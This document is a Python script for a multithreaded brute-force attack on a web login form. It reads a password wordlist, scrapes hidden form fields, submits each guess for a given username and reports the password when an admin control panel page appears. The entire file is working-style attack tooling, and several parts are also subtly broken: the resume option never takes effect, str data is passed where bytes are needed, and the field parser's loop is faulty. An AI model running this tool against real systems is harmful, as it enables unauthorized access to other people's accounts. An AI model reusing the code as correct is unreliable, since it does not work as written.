#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Brute-Force Login Tool
Author: Your Name
Date: YYYY-MM-DD
"""

import http.cookiejar
import queue
import threading
import urllib.error
import urllib.parse
import urllib.request
import argparse
import logging
from html.parser import HTMLParser

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Global settings
user_thread = 10
username = ""
wordlist_file = ""
resume = None
target_url = ""
target_post = ""
username_field = "username"
password_field = "passwd"
success_check = "Administration - Control Panel"

class BruteParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.tag_results = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name = None
            for name, value in attrs:
                if name == "name":
                    tag_name = value
                if tag_name:
                    self.tag_results[tag_name] = value

class Bruter:
    def __init__(self, user, words_q):
        self.username = user
        self.password_q = words_q
        self.found = False
        logging.info("Finished setting up for: %s", user)

    def run_bruteforce(self):
        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()
            jar = http.cookiejar.FileCookieJar("cookies")
            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

            try:
                response = opener.open(target_url)
                page = response.read()
                logging.info("Trying: %s : %s (%d left)", self.username, brute, self.password_q.qsize())

                # Parse out the hidden fields
                parser = BruteParser()
                parser.feed(page)

                post_tags = parser.tag_results
                post_tags[username_field] = self.username
                post_tags[password_field] = brute

                login_data = urllib.parse.urlencode(post_tags)
                login_response = opener.open(target_post, login_data)
                login_result = login_response.read()

                if success_check in login_result.decode():
                    self.found = True
                    logging.info("[*] Bruteforce successful.")
                    logging.info("[*] Username: %s", self.username)
                    logging.info("[*] Password: %s", brute)
                    logging.info("[*] Waiting for other threads to exit...")
            except Exception as e:
                logging.error("Error during brute-forcing: %s", str(e))

def build_wordlist(wordlst_file):
    """Read in the word list and return a queue of passwords."""
    with open(wordlst_file, "r") as fd:
        raw_words = [line.rstrip("\n") for line in fd]

    found_resume = False
    words = queue.Queue()

    for word in raw_words:
        if resume:
            if found_resume:
                words.put(word)
            else:
                if word == resume:
                    found_resume = True
                    logging.info("Resuming wordlist from: %s", resume)
                else:
                    words.put(word)
        else:
            words.put(word)
    return words

def main():
    global username, wordlist_file, target_url, target_post

    # Command-line argument parsing
    parser = argparse.ArgumentParser(description='Brute-force login tool')
    parser.add_argument('-u', '--username', required=True, help='Username for login')
    parser.add_argument('-w', '--wordlist', required=True, help='Path to the wordlist file')
    parser.add_argument('-r', '--resume', help='Resume from a specific password')
    parser.add_argument('-t', '--target', required=True, help='Target URL for login')
    args = parser.parse_args()

    username = args.username
    wordlist_file = args.wordlist
    resume = args.resume
    target_url = args.target
    target_post = target_url  # Assuming the post URL is the same as the target URL

    # Build the wordlist queue
    words = build_wordlist(wordlist_file)
    bruter_obj = Bruter(username, words)
    bruter_obj.run_bruteforce()

if __name__ == '__main__':
    main()